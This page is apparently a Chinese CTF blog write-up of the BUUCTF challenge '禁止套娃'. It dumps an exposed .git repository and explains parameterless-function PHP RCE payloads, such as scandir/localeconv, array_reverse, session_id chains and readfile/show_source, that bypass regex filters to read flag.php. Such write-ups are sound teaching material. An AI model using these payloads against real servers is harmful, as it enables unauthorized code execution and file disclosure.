<!DOCTYPE HTML>
<html>

<head>
	<link rel="bookmark"  type="image/x-icon"  href="/img/logo_miccall.png"/>
	<link rel="shortcut icon" href="/img/logo_miccall.png">
	
			    <title>
    ico's Blog
    </title>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
    <link rel="stylesheet" href="/css/mic_main.css" />
    <link rel="stylesheet" href="/css/dropdownMenu.css" />
    <meta name="keywords" content="miccall" />
    
    	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
	 
    <noscript>
        <link rel="stylesheet" href="/css/noscript.css" />
    </noscript>
    <style type="text/css">
        body:before {
          content: ' ';
          position: fixed;
          top: 0;
          background: url('/img/bg.jpg') center 0 no-repeat;
          right: 0;
          bottom: 0;
          left: 0;
          background-size: cover; 
        }
    </style>

			    
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
  


    <script src="/js/jquery.min.js"></script>
    <script src="/js/jquery.scrollex.min.js"></script>
    <script src="/js/jquery.scrolly.min.js"></script>
    <script src="/js/skel.min.js"></script>
    <script src="/js/util.js"></script>
    <script src="/js/main.js"></script>
	
<meta name="generator" content="Hexo 4.2.1"></head>
    
		
<!-- Layouts -->



<!--  代码渲染  -->
<link rel="stylesheet" href="/css/prism_coy.css" />
<link rel="stylesheet" href="/css/typo.css" />
<!-- 文章页 -->
<body class="is-loading">
    <!-- Wrapper 外包 s-->
    <div id="wrapper" class="fade-in">
        <!-- Intro 头部显示 s -->
        <!-- Intro 头部显示 e -->
        <!-- Header 头部logo start -->
        <header id="header">
    <a href="/" class="logo">MICCALL</a>
</header>
        <!-- Nav 导航条 start -->
        <nav id="nav" class="special" >
            <ul class="menu links" >
			<!-- Homepage  主页  --> 
			<li >
	            <a href="/" rel="nofollow">主页</a>
	        </li>
			<!-- categories_name  分类   --> 
	        
	        <li class="active">
	            <a href="#s1">分类</a>
	                    <ul class="submenu">
	                        <li>
	                        <a class="category-link" href="/categories/buuctf%E5%88%B7%E9%A2%98/">buuctf刷题</a></li><li><a class="category-link" href="/categories/knowledge/">knowledge</a></li><li><a class="category-link" href="/categories/web/">web</a>
	                    </ul>
	        </li>
	        
	        <!-- archives  归档   --> 
	        
	        
		        <!-- Pages 自定义   -->
		        
		        <li>
		            <a href="/about/" title="简历">
		                简历
		            </a>
		        </li>
		        
		        <li>
		            <a href="/group/" title="团队">
		                团队
		            </a>
		        </li>
		        
		        <li>
		            <a href="/gallery/" title="图库">
		                图库
		            </a>
		        </li>
		        
		        <li>
		            <a href="/tag/" title="标签">
		                标签
		            </a>
		        </li>
		        


            </ul>
            <!-- icons 图标   -->
			<ul class="icons">
                    
                    <li>
                        <a title="github" href="https://github.com/miccall" target="_blank" rel="noopener">
                            <i class="icon fa fa-github"></i>
                        </a>
                    </li>
                    
                    <li>
                        <a title="500px" href="http://500px.com" target="_blank" rel="noopener">
                            <i class="icon fa fa-500px"></i>
                        </a>
                    </li>
                    
			</ul>
</nav>

        <div id="main" >
            <div class ="post_page_title_img" style="height: 25rem;background-image: url(http://119.45.47.193/null5da3ac0c0a8c3870.jpg);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >禁止套娃</h2></a>
            </div>
            <!-- Post -->
            <div class="typo" style="padding: 3rem;">
                <h2><span id="禁止套娃">禁止套娃</span></h2><p>进去啥都没有，估计只能扫描，字典好能扫到/.git。然后用别人的脚本</p>
<pre><code>python GitHack.py http://172.21.4.12:10031/.git/</code></pre><p>但我脚本不知道为啥不能用，这里就直接用别人出来的源码吧</p>
<p>[]: <a href="https://www.gem-love.com/ctf/530.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/530.html</a></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string">"flag在哪里呢？&lt;br>"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[a-z|\-]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/et|na|nt|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment" spellcheck="true">// echo $_GET['exp'];</span>
                <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span><span class="token punctuation">{</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"还差一点哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"再好好想想！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"还想读flag，臭弟弟！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">// highlight_file(__FILE__);</span>
<span class="token delimiter">?></span></code></pre>
<p>看下正则匹配，<code>(?R)</code>引用当前表达式，后面加了<code>?</code>递归调用。只能匹配通过无参数的函数</p>
<p>然后<code>eval($_GET[&#39;exp&#39;]);</code> 典型的无参数RCE</p>
<p>由于正则匹配了一些关键字比如<code>et</code>导致很多函数不能用，getshell什么的基本不可能，只能考虑读源码。</p>
<h4><span id="如何得到文件名">如何得到文件名</span></h4><p>要想读出flag.php，就需要有一个函数返回flag.php文件名，<code>scandir()</code>函数可以扫描当前目录下的文件，例如：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<h4><span id="如何得到scandir中的">如何得到scandir()中的’.’</span></h4><h5><span id="1char46">1.char(46)</span></h5><p>对于这种方法<code>chr(46)</code>，又来了新的问题，46如何得到？我知道的有三种方法</p>
<ul>
<li>chr(rand())</li>
<li>chr(time())</li>
<li>chr(current(localtime(time())))</li>
</ul>
<p>首先解释一下<code>chr()</code>函数，我们知道<code>time()</code>返回一个非常大的数，却依然能够通过<code>chr(time())</code>得到一个点。这是因为<code>chr()</code>函数以256为一个周期，即<code>chr(0)</code> <code>chr(256)</code> <code>chr(512)</code>以此类推 他们都是相等。比如我们可以得到1w以内能够得到点的数</p>
<pre><code>46 302 558 814 1070 1326 1582 1838 2094 2350 2606 2862 3118 3374 3630 3886 4142 4398 4654 4910 5166 5422 5678 5934 6190 6446 6702 6958 7214 7470 7726 7982 8238 8494 8750 9006 9262 9518 9774</code></pre><p>因此，假设使用<code>chr(time())</code>，最多256秒(4.26min)走完一个周期，必定出现一个点。</p>
<p>但我本人喜欢用第三种：</p>
<p><code>localtime(time())</code>的返回一个数组，Array[0]为一个0~60之间的数字，每秒加1，所以最多一分钟就可以得到46。由于php数组内部指针默认指向第一个元素，所以<code>current()</code>或<code>pos()</code>取数组中当前元素的值，就得到了这个数字。</p>
<p>相关操作数组的方法有(源自w3school)：</p>
<ul>
<li><a href="https://www.w3school.com.cn/php/func_array_end.asp" target="_blank" rel="noopener">end()</a> – 将内部指针指向数组中的最后一个元素，并输出</li>
<li><a href="https://www.w3school.com.cn/php/func_array_next.asp" target="_blank" rel="noopener">next()</a> – 将内部指针指向数组中的下一个元素，并输出</li>
<li><a href="https://www.w3school.com.cn/php/func_array_prev.asp" target="_blank" rel="noopener">prev()</a> – 将内部指针指向数组中的上一个元素，并输出</li>
<li><a href="https://www.w3school.com.cn/php/func_array_reset.asp" target="_blank" rel="noopener">reset()</a> – 将内部指针指向数组中的第一个元素，并输出</li>
<li><a href="https://www.w3school.com.cn/php/func_array_each.asp" target="_blank" rel="noopener">each()</a> – 返回当前元素的键名和键值，并将内部指针向前移动</li>
</ul>
<p><code>end()</code>和<code>next()</code>很多时候都很有用</p>
<h5><span id="2currentlocaleconv">2.current(localeconv())</span></h5><p><code>localeconv()</code> 函数返回一包含本地数字及货币格式信息的数组，<code>current(localeconv())</code>永远都是个点</p>
<h5><span id="3phpversion">3.phpversion()</span></h5><p>[]: <a href="http://www.manongjc.com/detail/13-ksgbihhdbvdbnza.html" target="_blank" rel="noopener">http://www.manongjc.com/detail/13-ksgbihhdbvdbnza.html</a></p>
<blockquote>
<p><code>phpversion()</code>返回php版本，如<code>7.3.5
floor(phpversion())</code>返回<code>7
sqrt(floor(phpversion()))</code>返回<code>2.6457513110646
tan(floor(sqrt(floor(phpversion()))))</code>返回<code>-2.1850398632615
cosh(tan(floor(sqrt(floor(phpversion())))))</code>返回<code>4.5017381103491
sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code>返回<code>45.081318677156
ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>返回<code>46
chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>返回.</p>
<p><code>var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>扫描当前目录</p>
<p>next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))<code>返回</code>..</p>
</blockquote>
<h5><span id="4crypt">4.crypt()</span></h5><p>[]: <a href="https://www.jianshu.com/p/060d16584b8e" target="_blank" rel="noopener">https://www.jianshu.com/p/060d16584b8e</a></p>
<blockquote>
<p><code>readfile(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))));</code></p>
<p>原理：<code>hebrevc(crypt(arg))</code>可以随机生成一个hash值 第一个字符随机是 $(大概率) 或者 .(小概率) 然后通过ord chr只取第一个字符</p>
<p><code>if(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))readfile(end(scandir(chr(ord(strrev(crypt(serialize(array()))))))));</code></p>
<p>原理：<code>crypt(serialize(array()))</code> 原因同上</p>
</blockquote>
<h4><span id="如何得到flagphp">如何得到flag.php</span></h4><p>现在，我们尝试用<code>scandir()</code>扫描当前目录</p>
<pre><code>?exp=print_r(scandir(current(localeconv())));</code></pre><p>可见，flag.php是倒数第二个值，假设是倒数第一个我们可以用<code>end()</code>，但是并没有一个操作数组的函数能够输出数组的倒数第二个值。怎么办？请见如下3种方法</p>
<h5><span id="1array_reverse">1.array_reverse()</span></h5><p>看函数名就知道了，以相反的元素顺序返回数组</p>
<pre><code>?exp=print_r(array_reverse(scandir(current(localeconv()))));</code></pre><p>然后上面介绍操作数组的方法中，<code>next()</code>将内部指针指向数组中的下一个元素并输出，<code>next(array_reverse(scandir(pos(localeconv()))))</code>就得到了<code>flag.php</code></p>
<h5><span id="2array_randarray_flip">2.array_rand(array_flip())</span></h5><p><code>array_flip()</code>交换数组的键和值</p>
<pre><code>?exp=print_r(array_flip(scandir(current(localeconv()))));</code></pre><p><code>array_rand()</code>从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中<code>scandir()</code>返回的数组只有5个元素，刷新几次就能刷出来flag.php</p>
<pre><code>?exp=print_r(array_rand(array_flip(scandir(current(localeconv())))));</code></pre><h5><span id="3session_idsession_start">3.session_id(session_start())</span></h5><p>2020年1月13日更新<code>session_id()</code>解题方法：</p>
<p>sky师傅的<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">文章</a>里介绍了这种方法，本题目虽然ban了<code>hex</code>关键字，导致<code>hex2bin()</code>被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。</p>
<p>使用session之前需要通过<code>session_start()</code>告诉PHP使用session，php默认是不主动使用session的。</p>
<p><code>session_id()</code>可以获取到当前的session id。</p>
<p>因此我们手动设置名为<code>PHPSESSID</code>的cookie，并设置值为flag.php</p>
<p>然后获取到当前session id:</p>
<pre><code>?exp=print_r(session_id(session_start()));</code></pre><h4><span id="如何读flagphp的源码">如何读flag.php的源码</span></h4><p>因为<code>et</code>被ban了，所以不能使用<code>file_get_contents()</code>，但是可以可以使用<code>readfile()</code>或<code>highlight_file()</code>以及其别名函数<code>show_source()</code></p>
<pre><code>?exp=print_r(readfile(next(array_reverse(scandir(pos(localeconv()))))));</code></pre><pre><code>?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code></pre><pre><code>?exp=show_source(session_id(session_start()));</code></pre>
            </div>

            <!-- Post Comments -->
            
    <!-- 使用 DISQUS_CLICK -->
<div id="disqus-comment">
    <div id="disqus_thread"></div>

<!-- add animation -->
<style>
	.disqus_click_btn {
            line-height: 30px;
            margin: 0;
            min-width: 50px;
            padding: 0 14px;
            display: inline-block;
            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
            font-size: 14px;
            font-weight: 400;
            text-transform: uppercase;
            letter-spacing: 0;
            overflow: hidden;
            will-change: box-shadow;
            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
            outline: 0;
            cursor: pointer;
            text-decoration: none;
            text-align: center;
            vertical-align: middle;
            border: 0;
            background: rgba(158, 158, 158, .2);
            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
            color: #fff;
            background-color: #7EC0EE;
            text-shadow: 0
        }
</style>
	
<div class="btn_click_load" id="disqus_bt"> 
    <button class="disqus_click_btn">点击查看评论</button>
</div>

<!--
<script type="text/javascript">
$('.btn_click_load').click(function() {
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'http-miccall-tech'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();

    document.getElementById('disqus_bt').style.display = "none";
});
</script>
-->
<script type="text/javascript">
    var disqus_config = function () {
        this.page.url = 'https://cuony.github.io/2020/08/12/%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/';  // Replace PAGE_URL with your page's canonical URL variable
        this.page.identifier = 'https://cuony.github.io/2020/08/12/%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };
</script>

<script type="text/javascript">
    $('.btn_click_load').click(function() {  //click to load comments
        (function() { // DON'T EDIT BELOW THIS LINE
            var d = document;
            var s = d.createElement('script');
            s.src = '//http-miccall-tech.disqus.com/embed.js';
            s.setAttribute('data-timestamp', + new Date());
            (d.head || d.body).appendChild(s);
        })();
        $('.btn_click_load').css('display','none');
    });
</script>
</div>
<style>
    #disqus-comment{
        background-color: #eee;
        padding: 2pc;
    }
</style>


        </div>
        <!-- Copyright 版权 start -->
                <div id="copyright">
            <ul>
                <li>&copy;Powered By <a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener" style="border-bottom: none;">hexo</a></li>
                <li>Design: <a href="http://miccall.tech " target="_blank" rel="noopener" style="border-bottom: none;">miccall</a></li>
            </ul>
            
                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
			
        </div>
    </div>
</body>



 	
</html>
